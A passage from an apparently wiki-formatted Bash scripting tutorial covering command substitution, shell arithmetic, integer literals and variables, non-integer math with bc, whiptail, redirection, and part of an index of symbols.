# Asks the user for a password; saves it as $VARNAME.
# Returns a non-zero exit status if standard input is not a terminal, or if the
# &quot;read&quot; command returns a non-zero exit status.
{
  if [[ -t 0 ]] ; then
    read -r -p 'Password:' -s &quot;$1&quot; &amp;&amp; echo
  else
    return 1
  fi
}
 
get_password PASSWORD &amp;&amp; echo &quot;$PASSWORD&quot;
&lt;/source&gt;

There is really no reason that the caller should have to save the password in a variable. If &lt;tt&gt;get_password&lt;/tt&gt; simply printed the password to its standard output, then the caller could use command substitution, and use it directly:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
 
function get_password ( )
# Usage:     get_password
# Asks the user for a password; prints it for capture by calling code.
# Returns a non-zero exit status if standard input is not a terminal, or if
# standard output *is* a terminal, or if the &quot;read&quot; command returns a non-zero
# exit status.
{
  if [[ -t 0 ]] &amp;&amp; ! [[ -t 1 ]] ; then
    local PASSWORD
    read -r -p 'Password:' -s PASSWORD &amp;&amp; echo &gt;&amp;2
    echo &quot;$PASSWORD&quot;
  else
    return 1
  fi
}
 
echo &quot;$(get_password)&quot;
&lt;/source&gt;

To evaluate &lt;tt&gt;&quot;$(get_password)&quot;&lt;/tt&gt;, Bash runs the command &lt;tt&gt;get_password&lt;/tt&gt; in a subshell, capturing its standard output, and replaces &lt;tt&gt;$(get_password)&lt;/tt&gt; with the captured output.

In addition to the notation &lt;tt&gt;$(…)&lt;/tt&gt;, an older notation &lt;tt&gt;`…`&lt;/tt&gt; (using backquotes) is also supported, and still quite commonly found. The two notations have the same effect, but the syntax of &lt;tt&gt;`…`&lt;/tt&gt; is more restrictive, and in complex cases it can be trickier to get right.

Command substitution allows nesting; something like &lt;tt&gt;a &quot;$(b &quot;$(c)&quot;)&quot;&lt;/tt&gt; is allowed. (It runs the command &lt;tt&gt;c&lt;/tt&gt;, using its output as an argument to &lt;tt&gt;b&lt;/tt&gt;, and using the output of ''that'' as an argument to &lt;tt&gt;a&lt;/tt&gt;.)

A command substitution can actually contain a sequence of commands, rather than just one command. The output of all of these commands is captured. As we've seen previously, semicolons can be used instead of newlines to separate commands; that is particularly commonly done in command substitution. A command substitution can even contain variable assignments and function definitions (though, since the substituted commands run within a subshell, variable assignments and function definitions inside the command will not be seen outside it; they are only useful if they are used inside the substituted commands).

==Shell arithmetic==

Arithmetic expressions in Bash are closely modeled on those in C, so they are very similar to those in other C-derived languages, such as C++, Java, Perl, JavaScript, C#, and PHP. One major difference is that Bash only supports integer arithmetic (whole numbers), not floating-point arithmetic (decimals and fractions); something like &lt;tt style=&quot;white-space:nowrap&quot;&gt;3 + 4&lt;/tt&gt; means what you'd expect (7), but something like &lt;tt style=&quot;white-space:nowrap&quot;&gt;3.4 + 4.5&lt;/tt&gt; is a syntax error. Something like &lt;tt style=&quot;white-space:nowrap&quot;&gt;13 / 5&lt;/tt&gt; is fine, but performs integer division, so evaluates to 2 rather than to 2.6.

===Arithmetic expansion===

Perhaps the most common way to use arithmetic expressions is in ''arithmetic expansion'', where the result of an arithmetic expression is used as an argument to a command. Arithmetic expansion is denoted &lt;tt style=&quot;white-space:nowrap&quot;&gt;$(( … ))&lt;/tt&gt;. For example, this command:

&lt;source lang=&quot;bash&quot;&gt;echo $(( 3 + 4 * (5 - 1) ))&lt;/source&gt;

prints &lt;tt&gt;19&lt;/tt&gt;.

===Numeric operators===

In addition to the familiar notations &lt;tt&gt;+&lt;/tt&gt; (addition) and &lt;tt&gt;-&lt;/tt&gt; (subtraction), arithmetic expressions also support &lt;tt&gt;*&lt;/tt&gt; (multiplication), &lt;tt&gt;/&lt;/tt&gt; (integer division, described above), &lt;tt&gt;%&lt;/tt&gt; (the &quot;remainder&quot; operation; for example, 11 divided by 5 is 2 remainder 1, so &lt;tt style=&quot;white-space:nowrap&quot;&gt;11 % 5&lt;/tt&gt; is &lt;tt&gt;1&lt;/tt&gt;), and &lt;tt&gt;**&lt;/tt&gt; (&quot;exponentiation&quot;, i.e. involution; for example, 2&lt;sup&gt;4&lt;/sup&gt;&amp;nbsp;=&amp;nbsp;16, so &lt;tt style=&quot;white-space:nowrap&quot;&gt;2 ** 4&lt;/tt&gt; is &lt;tt&gt;16&lt;/tt&gt;).

The operators &lt;tt&gt;+&lt;/tt&gt; and &lt;tt&gt;-&lt;/tt&gt;, in addition to their &quot;binary&quot; (two-operand) senses of &quot;addition&quot; and &quot;subtraction&quot;, have &quot;unary&quot; (one-operand) senses of &quot;positive&quot; and &quot;negative&quot;. Unary &lt;tt&gt;+&lt;/tt&gt; has basically no effect; unary &lt;tt&gt;-&lt;/tt&gt; inverts the sign of its operand. For example, &lt;tt style=&quot;white-space:nowrap&quot;&gt;-(3*4)&lt;/tt&gt; evaluates to &lt;tt style=&quot;white-space:nowrap&quot;&gt;-12&lt;/tt&gt;, and &lt;tt style=&quot;white-space:nowrap&quot;&gt;-(-(3*4))&lt;/tt&gt; evaluates to &lt;tt&gt;12&lt;/tt&gt;.

===Referring to variables===

Inside an arithmetic expression, shell variables can be referred to directly, without using variable expansion (that is, without the dollar sign &lt;tt&gt;$&lt;/tt&gt;). For example, this:

&lt;source lang=&quot;bash&quot;&gt;i=2+3
echo $(( 7 * i ))&lt;/source&gt;

prints &lt;tt&gt;35&lt;/tt&gt;. (Note that &lt;tt&gt;i&lt;/tt&gt; is evaluated first, producing 5, and then it's multiplied by 7. If we had written &lt;tt&gt;$i&lt;/tt&gt; rather than &lt;tt&gt;i&lt;/tt&gt;, mere string substitution would have been performed; &lt;tt&gt;7 * 2+3&lt;/tt&gt; equals 14 + 3, that is, 17 — probably not what we want.)

===Assigning to variables===

Shell variables can also be assigned to within an arithmetic expression. The notation for this is similar to that of regular variable assignment, but is ''much'' more flexible. For example, the previous example could be rewritten like this:

&lt;source lang=&quot;bash&quot;&gt;echo $(( 7 * (i = 2 + 3) ))&lt;/source&gt;

except that this sets &lt;tt&gt;$i&lt;/tt&gt; to &lt;tt&gt;5&lt;/tt&gt; rather than to &lt;tt&gt;2+3&lt;/tt&gt;. Note that, although arithmetic expansion looks a bit like command substitution, it is ''not'' executed in a subshell; this command actually sets &lt;tt&gt;$i&lt;/tt&gt; to &lt;tt&gt;5&lt;/tt&gt;, and later commands can use the new value. (The parentheses inside the arithmetic expression are just the normal mathematical use of parentheses to control the order of operations.)

In addition to the simple assignment operator &lt;tt&gt;=&lt;/tt&gt;, Bash also supports compound operators such as &lt;tt&gt;+=&lt;/tt&gt;, &lt;tt&gt;-=&lt;/tt&gt;, &lt;tt&gt;*=&lt;/tt&gt;, &lt;tt&gt;/=&lt;/tt&gt;, and &lt;tt&gt;%=&lt;/tt&gt;, which perform an operation followed by an assignment. For example, &lt;tt style=&quot;white-space:nowrap&quot;&gt;(( i *= 2 + 3 ))&lt;/tt&gt; is equivalent to &lt;tt style=&quot;white-space:nowrap&quot;&gt;(( i = i * (2 + 3) ))&lt;/tt&gt;. In each case, the expression as a whole evaluates to the new value of the variable; for example, if &lt;tt&gt;$i&lt;/tt&gt; is &lt;tt&gt;4&lt;/tt&gt;, then &lt;tt style=&quot;white-space:nowrap&quot;&gt;(( j = i *= 3 ))&lt;/tt&gt; sets both &lt;tt&gt;$i&lt;/tt&gt; and &lt;tt&gt;$j&lt;/tt&gt; to &lt;tt&gt;12&lt;/tt&gt;.

Lastly, Bash supports increment and decrement operators. The increment operator &lt;tt&gt;++&lt;/tt&gt; increases a variable's value by 1; if it ''precedes'' the variable-name (as the &quot;pre-increment&quot; operator), then the expression evaluates to the variable's ''new'' value, and if it ''follows'' the variable-name (as the &quot;post-increment&quot; operator), then the expression evaluates to the variable's ''old'' value. For example, if &lt;tt&gt;$i&lt;/tt&gt; is &lt;tt&gt;4&lt;/tt&gt;, then &lt;tt style=&quot;white-space:nowrap&quot;&gt;(( j = ++i ))&lt;/tt&gt; sets both &lt;tt&gt;$i&lt;/tt&gt; and &lt;tt&gt;$j&lt;/tt&gt; to &lt;tt&gt;5&lt;/tt&gt;, while &lt;tt style=&quot;white-space:nowrap&quot;&gt;(( j = i++ ))&lt;/tt&gt; sets &lt;tt&gt;$i&lt;/tt&gt; to &lt;tt&gt;5&lt;/tt&gt; and &lt;tt&gt;$j&lt;/tt&gt; to &lt;tt&gt;4&lt;/tt&gt;. The decrement operator &lt;tt&gt;--&lt;/tt&gt; is exactly the same, except that it decreases the variable's value by 1. Pre-decrement and post-decrement are completely analogous to pre-increment and post-increment.

===Arithmetic expressions as their own commands===

A command can consist entirely of an arithmetic expression, using either of the following syntaxes:

&lt;source lang=&quot;bash&quot;&gt;(( i = 2 + 3 ))&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;let 'i = 2 + 3'&lt;/source&gt;

Either of these commands will set &lt;tt&gt;$i&lt;/tt&gt; to &lt;tt&gt;5&lt;/tt&gt;. Both styles of command return an exit status of zero (&quot;successful&quot; or &quot;true&quot;) if the expression evaluates to a non-zero value, and an exit status of one (&quot;failure&quot; or &quot;false&quot;) if the expression evaluates to zero. For example, this:

&lt;source lang=&quot;bash&quot;&gt;(( 0 )) || echo zero
(( 1 )) &amp;&amp; echo non-zero&lt;/source&gt;

will print this:

 zero
 non-zero

The reason for this counterintuitive behavior is that in C, zero means &quot;false&quot; and non-zero values (especially one) mean &quot;true&quot;. Bash maintains that legacy inside arithmetic expressions, then translates it into the usual Bash convention at the end.

===The comma operator===

Arithmetic expressions can contain multiple sub-expressions separated by commas &lt;tt&gt;,&lt;/tt&gt;. The result of the last sub-expression becomes the overall value of the full expression. For example, this:

&lt;source lang=&quot;bash&quot;&gt;echo $(( i = 2 , j = 2 + i , i * j ))&lt;/source&gt;

sets &lt;tt&gt;$i&lt;/tt&gt; to &lt;tt&gt;2&lt;/tt&gt;, sets &lt;tt&gt;$j&lt;/tt&gt; to &lt;tt&gt;4&lt;/tt&gt;, and prints &lt;tt&gt;8&lt;/tt&gt;.

The &lt;tt&gt;let&lt;/tt&gt; built-in actually supports multiple expressions directly without needing a comma; therefore, the following three commands are equivalent:

&lt;source lang=&quot;bash&quot;&gt;(( i = 2 , j = 2 + i , i * j ))&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;let 'i = 2 , j = 2 + i , i * j'&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;let 'i = 2' 'j = 2 + i' 'i * j'&lt;/source&gt;

===Comparison, Boolean, and conditional operators===

Arithmetic expressions support the integer comparison operators &lt;tt&gt;&lt;&lt;/tt&gt;, &lt;tt&gt;&gt;&lt;/tt&gt;, &lt;tt&gt;&lt;=&lt;/tt&gt; (meaning ≤), &lt;tt&gt;&gt;=&lt;/tt&gt; (meaning ≥), &lt;tt&gt;==&lt;/tt&gt; (meaning =)&lt;/tt&gt;, and &lt;tt&gt;!=&lt;/tt&gt; (meaning ≠). Each evaluates to &lt;tt&gt;1&lt;/tt&gt; for &quot;true&quot; or &lt;tt&gt;0&lt;/tt&gt; for &quot;false&quot;.

They also support the Boolean operators &lt;tt&gt;&amp;&amp;&lt;/tt&gt; (&quot;and&quot;), which evaluates to &lt;tt&gt;0&lt;/tt&gt; if either of its operands is zero, and to &lt;tt&gt;1&lt;/tt&gt; otherwise; &lt;tt&gt;||&lt;/tt&gt; (&quot;or&quot;), which evaluates to &lt;tt&gt;1&lt;/tt&gt; if either of its operands is nonzero, and to &lt;tt&gt;0&lt;/tt&gt; otherwise; and &lt;tt&gt;!&lt;/tt&gt; (&quot;not&quot;), which evaluates to &lt;tt&gt;1&lt;/tt&gt; if its operand is zero, and to &lt;tt&gt;0&lt;/tt&gt; otherwise. Aside from their use of zero to mean &quot;false&quot; and nonzero values to mean &quot;true&quot;, these are just like the operators &lt;tt&gt;&amp;&amp;&lt;/tt&gt;, &lt;tt&gt;||&lt;/tt&gt;, and &lt;tt&gt;!&lt;/tt&gt; that we've seen outside arithmetic expressions. Like those operators, these are &quot;short-cutting&quot; operators that do not evaluate their second argument if their first argument is enough to determine a result. For example, &lt;tt style=&quot;white-space:nowrap&quot;&gt;(( ( i = 0 ) &amp;&amp; ( j = 2 ) ))&lt;/tt&gt; will not evaluate the &lt;tt style=&quot;white-space:nowrap&quot;&gt;( j = 2 )&lt;/tt&gt; part, and therefore will not set &lt;tt&gt;$j&lt;/tt&gt; to &lt;tt&gt;2&lt;/tt&gt;, because the left operand of &lt;tt&gt;&amp;&amp;&lt;/tt&gt; is zero (&quot;false&quot;).

And they support the conditional operator &lt;tt style=&quot;white-space:nowrap&quot;&gt;''b'' ? ''e1'' : ''e2''&lt;/tt&gt;. This operator evaluates &lt;tt&gt;''e1''&lt;/tt&gt;, and returns its result, if &lt;tt&gt;''b''&lt;/tt&gt; is nonzero; otherwise, it evaluates &lt;tt&gt;''e2''&lt;/tt&gt; and returns its result.

These operators can be combined in complex ways:

&lt;source lang=&quot;bash&quot;&gt;(( i = ( ( a &gt; b &amp;&amp; c &lt; d + e || f == g + h ) ? j : k ) ))&lt;/source&gt;

===Arithmetic for-loops===

Above, we saw one style of for-loop, that looked like this:

&lt;source lang=&quot;bash&quot;&gt;
# print all integers 1 through 20:
for i in {1..20} ; do
  echo $i
done
&lt;/source&gt;

Bash also supports another style, modeled on the for-loops of C and related languages, using shell arithmetic:

&lt;source lang=&quot;bash&quot;&gt;
# print all integers 1 through 20:
for (( i = 1 ; i &lt;= 20 ; ++i )) ; do
  echo $i
done
&lt;/source&gt;

This for-loop uses three separate arithmetic expressions, separated by semicolons &lt;tt&gt;;&lt;/tt&gt; (and not commas &lt;tt&gt;,&lt;/tt&gt; — these are completely separate expressions, not just sub-expressions). The first is an initialization expression, run before the loop begins. The second is a test expression; it is evaluated before every potential loop iteration (including the first), and if it evaluates to zero (&quot;false&quot;), then the loop exits. The third is a counting expression; it is evaluated at the end of each loop iteration. In other words, this for-loop is exactly equivalent to this while-loop:

&lt;source lang=&quot;bash&quot;&gt;
# print all integers 1 through 20:
(( i = 1 ))
while (( i &lt;= 20 )) ; do
  echo $i
  (( ++i ))
done
&lt;/source&gt;

but, once you get used to the syntax, it makes it more clear what is going on.

===Bitwise operators===

In addition to regular arithmetic and Boolean operators, Bash also offers &quot;bitwise&quot; operators, meaning operators that operate on integers ''qua'' bit-strings rather than ''qua'' integers. If you are not already familiar with this concept, you can safely ignore these.

Just as in C, the bitwise operators are &lt;tt&gt;&amp;&lt;/tt&gt; (bitwise &quot;and&quot;), &lt;tt&gt;|&lt;/tt&gt; (bitwise &quot;or&quot;), &lt;tt&gt;^&lt;/tt&gt; (bitwise &quot;exclusive or&quot;), &lt;tt&gt;~&lt;/tt&gt; (bitwise &quot;not&quot;), &lt;tt&gt;&lt;&lt;&lt;/tt&gt; (bitwise left-shift), and &lt;tt&gt;&gt;&gt;&lt;/tt&gt; (bitwise right-shift), as well as &lt;tt&gt;&amp;=&lt;/tt&gt; and &lt;tt&gt;|=&lt;/tt&gt; and &lt;tt&gt;^=&lt;/tt&gt; (which include assignment, just like &lt;tt&gt;+=&lt;/tt&gt;).

===Integer literals===

An integer constant is expressed as an ''integer literal''. We have already seen many of these; &lt;tt&gt;34&lt;/tt&gt;, for example, is an integer literal denoting the number 34. All of our examples have been ''decimal'' (base ten) integer literals, which is the default; but in fact, literals may be expressed in any base in the range 2&amp;ndash;64, using the notation &lt;tt&gt;&lt;var&gt;base&lt;/var&gt;#&lt;var&gt;value&lt;/var&gt;&lt;/tt&gt; (with the base itself being expressed in base-ten). For example, this:

 '''echo''' $'''((''' 12 '''))'''        # use the default of base ten (decimal)
 '''echo''' $'''((''' 10#12 '''))'''     # explicitly specify base ten (decimal)
 '''echo''' $'''((''' 2#1100 '''))'''    # base two (binary)
 '''echo''' $'''((''' 8#14 '''))'''      # base eight (octal)
 '''echo''' $'''((''' 16#C '''))'''      # base sixteen (hexadecimal)
 '''echo''' $'''((''' 8 + 2#100 '''))''' # eight in base ten (decimal), plus four in base two (binary)

will print &lt;tt&gt;12&lt;/tt&gt; six times. (Note that this notation only affects how an integer literal is interpreted. The result of the arithmetic expansion is still expressed in base ten, regardless.)

For bases 11 through 36, the English letters A through Z are used for digit-values 10 through 35. This is not case-sensitive. For bases 37 through 64, however, it is specifically the lowercase English letters that are used for digit-values 10 through 35, with the uppercase letters being used for digit-values 36 through 61, the at-sign &lt;tt&gt;@&lt;/tt&gt; being used for digit-value 62, and the underscore &lt;tt&gt;_&lt;/tt&gt; being used for digit-value 63. For example, &lt;tt&gt;64#@A3&lt;/tt&gt; denotes 256259 (&lt;span style=&quot;white-space:nowrap&quot;&gt;62 × 64&lt;sup&gt;2&lt;/sup&gt; + 36 × 64 + 3&lt;/span&gt;).

There are also two special notations: prefixing a literal with &lt;tt&gt;0&lt;/tt&gt; indicates base-eight (octal), and prefixing it with &lt;tt&gt;0x&lt;/tt&gt; or &lt;tt&gt;0X&lt;/tt&gt; indicates base-sixteen (hexadecimal). For example, &lt;tt&gt;030&lt;/tt&gt; is equivalent to &lt;tt&gt;8#30&lt;/tt&gt;, and &lt;tt&gt;0x6F&lt;/tt&gt; is equivalent to &lt;tt&gt;16#6F&lt;/tt&gt;.

===Integer variables===

A variable may be declared as an integer variable — that is, its &quot;integer attribute&quot; may be &quot;set&quot; — by using this syntax:

&lt;source lang=&quot;bash&quot;&gt;declare -i n&lt;/source&gt;

After running the above command, any subsequent assignments to &lt;tt&gt;n&lt;/tt&gt; will automatically cause the right-hand side to be interpreted as an arithmetic expression. For example, this:

&lt;source lang=&quot;bash&quot;&gt;
declare -i n
n='2 + 3 &gt; 4'
&lt;/source&gt;

is more or less equivalent to this:

&lt;source lang=&quot;bash&quot;&gt;n=$((2 + 3 &gt; 4))&lt;/source&gt;

except that the first version's &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;declare -i n&lt;/source&gt; will continue to affect later assignments as well.

In the first version, note the use of quotes around the right-hand side of the assignment. Had we written &lt;tt style=&quot;white-space:nowrap&quot;&gt;n=2 + 3 &gt; 4&lt;/tt&gt;, it would have meant &quot;run the command &lt;tt&gt;+&lt;/tt&gt; with the argument &lt;tt&gt;3&lt;/tt&gt;, passing in the environment variable &lt;tt&gt;n&lt;/tt&gt; set to &lt;tt&gt;2&lt;/tt&gt;, and redirecting standard output into the file &lt;tt&gt;4&lt;/tt&gt;&quot;; which is to say, setting a variable's integer attribute doesn't affect the overall parsing of assignment statements, but merely controls the interpretation of the value that is finally assigned to the variable.

We can &quot;unset&quot; a variable's integer attribute, turning off this behavior, by using the opposite command:

&lt;source lang=&quot;bash&quot;&gt;declare +i n&lt;/source&gt;

The &lt;tt&gt;declare&lt;/tt&gt; built-in command has a number of other uses as well: there are a few other attributes a variable can have, and &lt;tt&gt;declare&lt;/tt&gt; has a few other features besides turning attributes on and off. In addition, a few of its properties bear note:

* As with &lt;tt&gt;local&lt;/tt&gt; and &lt;tt&gt;export&lt;/tt&gt;, the argument can be a variable assignment; for example, &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;declare -i n=2+3&lt;/source&gt; sets &lt;tt&gt;$n&lt;/tt&gt;'s integer attribute and sets it to &lt;tt&gt;5&lt;/tt&gt;.
* As with &lt;tt&gt;local&lt;/tt&gt; and &lt;tt&gt;export&lt;/tt&gt;, multiple variables (and/or assignments) can be specified at once; for example, &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;declare -i m n&lt;/source&gt; sets both &lt;tt&gt;$m&lt;/tt&gt; integer attribute and &lt;tt&gt;$n&lt;/tt&gt;'s.
* When used inside a function, &lt;tt&gt;declare&lt;/tt&gt; implicitly localizes the variable (unless the variable is already local), which also has the effect of locally unsetting it (unless the assignment syntax is used).

===Non-integer arithmetic===

As mentioned above, Bash shell arithmetic only supports integer arithmetic. However, external programs can often be used to obtain similar functionality for non-integer values. In particular, the common Unix utility &lt;tt&gt;bc&lt;/tt&gt; is often used for this. The following command:

&lt;source lang=&quot;bash&quot;&gt;echo &quot;$(echo '3.4 + 2.2' | bc)&quot;&lt;/source&gt;

prints &lt;tt&gt;5.6&lt;/tt&gt;. Needless to say, since &lt;tt&gt;bc&lt;/tt&gt; is not so tightly integrated with Bash as shell arithmetic is, it is not as convenient; for example, something like this:

&lt;source lang=&quot;bash&quot;&gt;
# print the powers of two, from 1 to 512:
for (( i = 1 ; i &lt; 1000 ; i *= 2 )) ; do
  echo $i
done
&lt;/source&gt;

would, to support non-integers, become something like this:

&lt;source lang=&quot;bash&quot;&gt;
# print the powers of one-half, from 1 to 1/512:
i=1
while [ $( echo &quot;$i &gt; 0.001&quot; | bc ) = 1 ] ; do
  echo $i
  i=$( echo &quot;scale = scale($i) + 1 ; $i / 2&quot; | bc )
done
&lt;/source&gt;

Part of this is because we can no longer use an arithmetic for-loop; part of it is because referring to variables and assigning to variables is trickier now (since &lt;tt&gt;bc&lt;/tt&gt; is not aware of the shell's variables, only its own, unrelated ones); and part of it is because &lt;tt&gt;bc&lt;/tt&gt; communicates with the shell only via input and output.

==Input / Output==

===User===
====Using whiptail====
Whiptail is a program that allows shell scripts to display [[w:Dialog box|dialog boxes]] to the user for informational purposes, or to get input from the user in a friendly way. Whiptail is included by default on [[w:Debian|Debian]].
:From the [http://www.tldp.org/LDP/Linux-Dictionary/html/w.html GNU/Linux Dictionary]: whiptail is a &quot;dialog&quot; replacement using newt instead of ncurses.
:From its README: whiptail is designed to be drop-in compatible with dialog(1), but has less features: some dialog boxes are not implemented, such as tailbox, timebox, calendarbox, etc.

See [[Bash Shell Scripting/Whiptail]].

===Files===
====Shell redirection====
In shells, redirection is used for file I/O. The most common usage of is to redirect standard streams (stdin, stdout and stderr) to accept input from another program via piping, to save program output as a file, and to suppress program output by redirecting a stream to &lt;tt&gt;/dev/null&lt;/tt&gt;.

&lt;!-- Need powerful but easy to understand examples of this. --&gt;

==Index of symbols==

&lt;table class=&quot;wikitable&quot;&gt;

&lt;tr&gt; &lt;th&gt;Symbol&lt;/th&gt; &lt;th&gt;Explanation&lt;/th&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;!&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;Logically negates the exit status of a pipeline. For example, if &lt;tt&gt;grep YES votes.txt&lt;/tt&gt; returns &lt;tt&gt;0&lt;/tt&gt;, then &lt;tt&gt;! grep YES votes.txt&lt;/tt&gt; returns &lt;tt&gt;1&lt;/tt&gt;, but is otherwise equivalent.&lt;/li&gt; &lt;li&gt;Also supported by the &lt;tt&gt;[ ... ]&lt;/tt&gt; builtin, and inside conditional expressions. For example, if &lt;tt&gt;[&amp;#x5B; -e file.txt &amp;#x5D;]&lt;/tt&gt; is true, then &lt;tt&gt;[&amp;#x5B; ! -e file.txt &amp;#x5D;]&lt;/tt&gt; is false.&lt;/li&gt; &lt;li&gt;Also supported in arithmetic expressions. For example, if &lt;tt&gt;$i&lt;/tt&gt; is nonzero, then &lt;tt&gt;$(( ! i ))&lt;/tt&gt; is &lt;tt&gt;0&lt;/tt&gt;.&lt;/li&gt; &lt;li&gt;See also &lt;tt&gt;#!&lt;/tt&gt; below.&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;&quot;&amp;hellip;&quot;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;Quotes an argument (or part of an argument) so that it is not split by whitespace into multiple arguments, but without preventing parameter expansion and command substitution internally.&lt;/li&gt; &lt;li&gt;See also &lt;tt&gt;$&quot;&amp;hellip;&quot;&lt;/tt&gt; below.&lt;/li&gt; &lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;#&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;Introduces a comment (which continues to the end of the line). For example, the command &lt;tt&gt;foo bar baz # bip&lt;/tt&gt; is equivalent to the command &lt;tt&gt;foo bar baz&lt;/tt&gt;, because the comment &lt;tt&gt;# bip&lt;/tt&gt; is removed.&lt;/li&gt; &lt;li&gt;Inside an arithmetic expression, an integer literal of the form &lt;tt&gt;&lt;var&gt;b&lt;/var&gt;#&lt;var&gt;n&lt;/var&gt;&lt;/tt&gt; is interpreted in base &lt;tt&gt;&lt;var&gt;b&lt;/var&gt;&lt;/tt&gt;. For example, &lt;tt&gt;2#110110&lt;/tt&gt; is binary 110110, i.e. fifty-four.&lt;/li&gt; &lt;li&gt;See also &lt;tt&gt;#!&lt;/tt&gt; below.&lt;/li&gt; &lt;li&gt;See also &lt;tt&gt;$#&lt;/tt&gt; below.&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;#!&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;Used at the very beginning of an executable script to specify the interpreter that should be used to run it. For example, if the first line of &lt;tt&gt;script.pl&lt;/tt&gt; is &lt;tt&gt;#!/usr/bin/perl&lt;/tt&gt;, and &lt;tt&gt;script.pl&lt;/tt&gt; has executable permissions, then &lt;tt&gt;./script.pl&lt;/tt&gt; is roughly equivalent to &lt;tt&gt;/usr/bin/perl ./script.pl&lt;/tt&gt;.&lt;/li&gt; &lt;li&gt;The first line of a Bash script is generally either &lt;tt&gt;#!/bin/bash&lt;/tt&gt; or &lt;tt&gt;#!/bin/sh&lt;/tt&gt;. (The former is generally considered preferable.)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;$&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;Introduces various types of expansions, notably parameter expansion (as in &lt;tt&gt;$&lt;var&gt;var&lt;/var&gt;&lt;/tt&gt; or &lt;tt&gt;${&lt;var&gt;var&lt;/var&gt;}&lt;/tt&gt;), command substitution (as in &lt;tt&gt;$(&lt;var&gt;command&lt;/var&gt;)&lt;/tt&gt;), and arithmetic expansion (as in &lt;tt&gt;$((&lt;var&gt;expression&lt;/var&gt;))&lt;/tt&gt;).&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;$&quot;&amp;hellip;&quot;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;A variant of &lt;tt&gt;&quot;&amp;hellip;&quot;&lt;/tt&gt; (see above) that supports locale-specific translation. (Unless you're writing scripts for use in multiple languages, e.g. both English and French, you don't need to worry about this.)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;$#&lt;/tt&gt;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;The number of positional parameters (arguments to a script or function). For example, if a script is invoked as &lt;tt&gt;script.sh a b c&lt;/tt&gt;, then &lt;tt&gt;$#&lt;/tt&gt; will be &lt;tt&gt;3&lt;/tt&gt;. Builtins that modify positional parameters, such as &lt;tt&gt;shift&lt;/tt&gt; and &lt;tt&gt;set&lt;/tt&gt;, affect &lt;tt&gt;$#&lt;/tt&gt; as well.&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;%&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;The modulus operator. Returns the remainder resulting from integer division. E.g. 5%2 = 1&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;&amp;amp;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Ampersand. Commonly used to start a command in the background. E.g. firefox &amp;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;'&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Single quote. Used to quote text literally.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;(&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Open parenthesis. Used to denote the beginning of a subshell, among other things.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;)&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Closing parenthesis. Used to denote the &quot;EOF&quot; of a subshell.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;*&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Asterisk. Denotes multiplication. E.g. 5*2 = 10&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;+&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Plus. Denotes addition. E.g. 5+2 = 7&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;,&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Comma. Used for separation. E.g. ls file{1,2,3}&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;-&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Hyphen. Denotes subtraction. E.g. 5-2 = 3&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;.&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Full Stop.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;/&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Forward slash. Denotes integer division (e.g. 5/2=2) or part of a path (e.g. /home/user)&lt;/td&gt; &lt;/tr&gt;

